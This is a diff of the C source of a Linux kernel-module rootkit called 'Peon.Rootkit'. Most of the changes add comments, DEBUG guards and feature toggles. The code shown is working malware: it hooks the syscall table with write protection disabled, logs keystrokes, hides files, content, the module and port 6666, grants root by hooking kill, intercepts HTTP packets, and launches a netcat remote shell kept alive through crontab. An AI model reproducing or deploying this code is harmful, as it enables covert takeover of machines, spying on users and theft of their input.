@@ -40,13 +40,13 @@
 
 /* define what you want*/
 #define ROOTACCESS
-#define HIDEMODULE
+//#define HIDEMODULE
 //#define KEYLOGGER
 #define HIDECONTENT
-#define HIDEFILE
-#define REMOTESHELL
-#define NETWORK_HTTP
-#define HIDE_COMM
+//#define HIDEFILE
+//#define REMOTESHELL
+//#define NETWORK_HTTP
+//#define HIDE_COMM
 
 #define SECRETPROCESS "_root_"
 #define SECRETLINE "--ROOT--"
@@ -63,12 +63,11 @@
 #define PID_4_SHOW_MOD 22222
 
 /* file path  */
-#define KEYLOG_PATH "/home/keylogger.txt"
-#define NET_PATH "/home/test.txt"
+#define KEYLOG_PATH "/tmp/keylogger.txt"
+#define NET_PATH "/tmp/test.txt"
 
 /*hide hacker port*/
 #define PORT_TO_HIDE 6666
-
 
 
 
@@ -101,6 +100,7 @@ struct linux_dirent {
     char d_name[1];
 };
 
+/* saved file offset needed for append_filez func*/
 unsigned long long file_saved_offset = 0;
 
 char *strnstr(const char *haystack, const char *needle, size_t n) {
@@ -176,6 +176,9 @@ void file_close(struct file* file) {
     filp_close(file, NULL);
 }
 
+/*
+ *function read data into file
+ */
 int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
     mm_segment_t oldfs;
     int ret;
@@ -189,6 +192,9 @@ int file_read(struct file* file, unsigned long long offset, unsigned char* data,
     return ret;
 }
 
+/*
+ *function write data into file
+ */
 int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
     mm_segment_t oldfs;
     int ret;
@@ -207,6 +213,9 @@ int file_sync(struct file* file) {
     return 0;
 }
 
+/*
+ *function append data into path_file and with size
+ */
 char append_filez(const char *path_file, unsigned char * data, unsigned int size) {
     struct file* fd = NULL;
     int error;
@@ -246,7 +255,7 @@ unsigned long **find_syscall_table(void) {
     return NULL;
 }
 
-void disable_wp(void) {
+void disable_wp(void) { //disable write protection
 
 #if defined(OS_64_BITS)
 
@@ -269,7 +278,7 @@ void disable_wp(void) {
 #endif
 }
 
-void enable_wp(void) {
+void enable_wp(void) { //enable write protection
 
 #if defined(OS_64_BITS)
 
@@ -321,7 +330,7 @@ LeftArrow: 0x1b 0x5B 0x44
 
 #ifdef KEYLOGGER
 
-void check_keyboard_buf(char __user *buf) {
+void check_keyboard_buf(char __user *buf) { //func parsing keycode send by sys_read
     u16 index = 0;
     int temp1, temp2;
 
@@ -405,21 +414,29 @@ void check_keyboard_buf(char __user *buf) {
 #endif
 
 #ifdef HOOK_READ
-asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count);
+asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count); //original sys_read call
 
-asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) {
+asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) { //hooked sys_read call
 
-    long ret = orig_read_call(fd, buf, count);
+    long ret = orig_read_call(fd, buf, count); // call original sys_read 
 
 
     if (ret < 0)return ret;
+
 #ifdef KEYLOGGER
+    /*
+     *read from fd =0 coresponding to stdin
+     */
     if (fd == 0) {
         check_keyboard_buf(buf);
     }
 #endif
 
 #ifdef HIDECONTENT
+    /*
+     *hide content between  2 SECRETLINE markup
+     */
+
     if ((fd < 50) && (fd > 2)) {
         char *kbuf = NULL, *ch = NULL, *ch2 = NULL;
         long modif_ret = 0;
@@ -431,18 +448,20 @@ asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) 
         memset(kbuf, 0, ret + 1);
         copy_from_user(kbuf, buf, ret);
 
-        ch = strstr(kbuf, SECRETLINE);
+        ch = strstr(kbuf, SECRETLINE); // find first markup
         if (ch != NULL) {
-            ch2 = strstr(ch + strlen(SECRETLINE) + 1, SECRETLINE);
+            ch2 = strstr(ch + strlen(SECRETLINE) + 1, SECRETLINE); // find second markup
         }
 
         //if find it
         if (ch != NULL && ch2 != NULL) {
+#ifdef DEBUG
             printk(KERN_ALERT "Peon.Rootkit: HIDECONTENT\n");
+#endif
             modif_ret = strlen(ch) - strlen(ch2);
-            memmove(ch, ch2 + strlen(SECRETLINE), strlen(ch2) - strlen(SECRETLINE)-1);
-            memset(ch + strlen(ch2)-2, 0, ret+ strlen(SECRETLINE));
-            copy_to_user(buf, kbuf, modif_ret);
+            memmove(ch, ch2 + strlen(SECRETLINE), strlen(ch2) - strlen(SECRETLINE) - 1); // copy over between markup pattern SECRETLINE 
+            memset(ch + strlen(ch2) - 2, 0, ret + strlen(SECRETLINE)); //fill limit with 0
+            copy_to_user(buf, kbuf, ret);
         }
         kfree(kbuf);
     }
@@ -458,11 +477,11 @@ asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) 
 #ifdef HIDEFILE
 #if defined(OS_64_BITS)
 /* -------------------------- 64 bits getdents version ------------------------------------------ */
-asmlinkage long (*orig_getdents) (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
+asmlinkage long (*orig_getdents) (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count); //original sys_getdents call
 
-asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
+asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) { //hoocked sys_getdents call
 
-    int ret = orig_getdents(fd, dirent, count);
+    int ret = orig_getdents(fd, dirent, count); // call original sys_getdents
     {
 
         unsigned long off = 0;
@@ -472,9 +491,13 @@ asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent __user *dir
         for (off = 0; off < ret;) {
 
             dir = (void*) dirent + off;
-            /* hide files containing name _root_ */
+
+            /* find if filename contains SECRETLINE */
             if ((strstr(dir->d_name, SECRETFILE)) != NULL) {
+#ifdef DEBUG
                 printk(KERN_ALERT "Peon.Rootkit: hide.64 %s", dir->d_name);
+#endif    	
+                /* hide files containing name _root_ */
                 ret -= dir->d_reclen;
                 if (dir->d_reclen + off < ret)
                     memmove((void*) dir, (void*) ((void*) dir + dir->d_reclen), (size_t) (ret - off));
@@ -487,11 +510,11 @@ asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent __user *dir
 #else
 
 /* -------------------------- 32 bits getdents version ------------------------------------------ */
-asmlinkage long (*orig_getdents64) (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
+asmlinkage long (*orig_getdents64) (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count); //original sys_getdents64 call
 
-asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
+asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) { //hoocked sys_getdents64 call
 
-    int ret = orig_getdents64(fd, dirent, count);
+    int ret = orig_getdents64(fd, dirent, count); // call original sys_getdents64
     {
 
         unsigned long off = 0;
@@ -501,9 +524,13 @@ asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user 
         for (off = 0; off < ret;) {
 
             dir = (void*) dirent + off;
-            /* hide files containing name _root_ */
+
+            /* find if filename contains SECRETLINE */
             if ((strstr(dir->d_name, SECRETFILE)) != NULL) {
+#ifdef DEBUG
                 printk(KERN_ALERT "Peon.Rootkit: hide %s", dir->d_name);
+#endif
+                /* hide files containing name _root_ */
                 ret -= dir->d_reclen;
                 if (dir->d_reclen + off < ret)
                     memmove((void*) dir, (void*) ((void*) dir + dir->d_reclen), (size_t) (ret - off));
@@ -517,9 +544,9 @@ asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user 
 #endif
 
 #ifdef HOOK_KILL
-asmlinkage long (*kill_orig_call) (pid_t pid, int sig);
+asmlinkage long (*kill_orig_call) (pid_t pid, int sig); //original sys_kill call
 
-asmlinkage long kill_hook_call(pid_t pid, int sig) {
+asmlinkage long kill_hook_call(pid_t pid, int sig) { //hoocked sys_kill call
 
 #ifdef ROOTACCESS
     /* Root access func*/
@@ -530,7 +557,7 @@ asmlinkage long kill_hook_call(pid_t pid, int sig) {
         cur_task = current;
         credz = cur_task->cred;
         credz->uid = 0;
-        /*credz->gid=0;
+        /*credz->gid=1337;
         credz->suid=0;
         credz->sgid=0;
         credz->euid=0;
@@ -553,7 +580,7 @@ asmlinkage long kill_hook_call(pid_t pid, int sig) {
 #endif
     }
 #endif
-    return kill_orig_call(pid, sig);
+    return kill_orig_call(pid, sig); // return original sys_kill func
 }
 #endif
 
@@ -562,6 +589,11 @@ asmlinkage long kill_hook_call(pid_t pid, int sig) {
 
 #ifdef NETWORK_HTTP
 
+/*
+ *func call by the net_device
+ *expect  a TCP packet and form source port 80 or 8080
+ * modify http packet you can modify it as you wish
+ */
 int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt, struct net_device *dev2) {
     if (skb->pkt_type == PACKET_HOST) {
         struct iphdr *ip;
@@ -572,7 +604,7 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
             //tcp_hdr=tcp_hdr(skb);
             tcp_hdr = (struct tcphdr *) (ip->ihl * 4 + skb->data);
             data = (unsigned char *) ((__u32 *) tcp_hdr + tcp_hdr->doff);
-            /* check if source port is from http */
+            /* check if source port is from http  or from proxy */
             if (tcp_hdr->source == ntohs(80) || tcp_hdr->source == ntohs(8080)) {
                 char *tmp = NULL;
 #ifdef DEBUG
@@ -584,6 +616,8 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
                 printk(KERN_ALERT "Peon.Rootkit: data=%s\n", data);
                 append_filez(NET_PATH, data, strlen(data));
 #endif
+                /* modify http packet you can modify it as you wish */
+                /* find "-----------------------------" pattern and replace each char by A */
                 tmp = strstr(data, "-----------------------------");
                 if (tmp != NULL) {
                     int i = 0;
@@ -602,8 +636,12 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
 
 #ifdef HIDE_COMM
 
+/* original tcp4_seq_show func */
 int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;
 
+/* hoocked tcp4_seq_show func
+ * hide PORT_TO_HIDE port
+ */
 int hacked_tcp4_seq_show(struct seq_file *seq, void *v) {
     int retval = old_tcp4_seq_show(seq, v);
 
@@ -616,30 +654,38 @@ int hacked_tcp4_seq_show(struct seq_file *seq, void *v) {
     return retval;
 }
 
+/*
+ * init func for hiding comm
+ * attach the hooked tcp4_seq_show
+ */
 void init_hide_net(void) {
 
     struct tcp_seq_afinfo *my_afinfo = NULL;
     struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
 
-    while (strcmp(my_dir_entry->name, "tcp"))
-        my_dir_entry = my_dir_entry->next;
+    while (strcmp(my_dir_entry->name, "tcp")) //finc tcp conn.
+        my_dir_entry = my_dir_entry->next; //go next
 
     if ((my_afinfo = (struct tcp_seq_afinfo*) my_dir_entry->data)) {
-        old_tcp4_seq_show = my_afinfo->seq_ops.show;
-        my_afinfo->seq_ops.show = hacked_tcp4_seq_show;
+        old_tcp4_seq_show = my_afinfo->seq_ops.show; //save original call
+        my_afinfo->seq_ops.show = hacked_tcp4_seq_show; //attach the hooked one
     }
 
 }
 
+/*
+ * exit func for hiding comm
+ * attach original tcp4_seq_show call
+ */
 void exit_hide_net(void) {
     struct tcp_seq_afinfo *my_afinfo = NULL;
     struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
 
-    while (strcmp(my_dir_entry->name, "tcp"))
-        my_dir_entry = my_dir_entry->next;
+    while (strcmp(my_dir_entry->name, "tcp")) //finc tcp conn.
+        my_dir_entry = my_dir_entry->next; //go next
 
     if ((my_afinfo = (struct tcp_seq_afinfo*) my_dir_entry->data)) {
-        my_afinfo->seq_ops.show = old_tcp4_seq_show;
+        my_afinfo->seq_ops.show = old_tcp4_seq_show; //attach original tcp4_seq_show call
     }
 }
 #endif
@@ -659,8 +705,9 @@ void remote_shell(void) {
     call_usermodehelper(argv4[0], argv4, envp, UMH_WAIT_PROC); /*Add rule to crontab to launch netcat every minute*/
 
     allow_signal(SIGKILL);
-
+#ifdef DEBUG
     printk(KERN_ALERT "ROOTKIT Remote Shell RUN\n");
+#endif
     call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); //Launch netcat the fisrt time
 
     return;
@@ -684,7 +731,7 @@ int init_module(void) {
 #ifdef HIDEMODULE
     /* hide module : lsmod */
     mod = THIS_MODULE; //save module
-    list_del(&THIS_MODULE->list);
+    list_del(&THIS_MODULE->list); //detach module form module list
     FIRST_SHOW_MODULE = 1;
 #ifdef DEBUG
     printk(KERN_INFO "Peon.Rootkit is hidden\n");
@@ -759,6 +806,7 @@ int init_module(void) {
 #endif
 
 #ifdef HIDE_COMM
+    /* init func for hiding comm */
     init_hide_net();
 #endif
 
@@ -766,7 +814,8 @@ int init_module(void) {
 
 
 #ifdef REMOTESHELL
-    remote_shell(); /*Launch the remote shell*/
+    /*Launch the remote shell*/
+    remote_shell();
 #endif
 
 #ifdef DEBUG
@@ -782,6 +831,7 @@ void cleanup_module(void) {
 
 
 #ifdef HIDE_COMM
+    /* attack original tcp4_seq_show */
     exit_hide_net();
 #endif
 
@@ -806,8 +856,8 @@ void cleanup_module(void) {
 #endif
 
 #ifdef NETWORK_HTTP
-
-    __dev_remove_pack(&pt); //remove interfacepacket layer2
+    /* remove interfacepacket layer2 */
+    __dev_remove_pack(&pt);
 
 #ifdef DEBUG
     printk(KERN_INFO "Peon.Rootkit remove our Network device!\n");
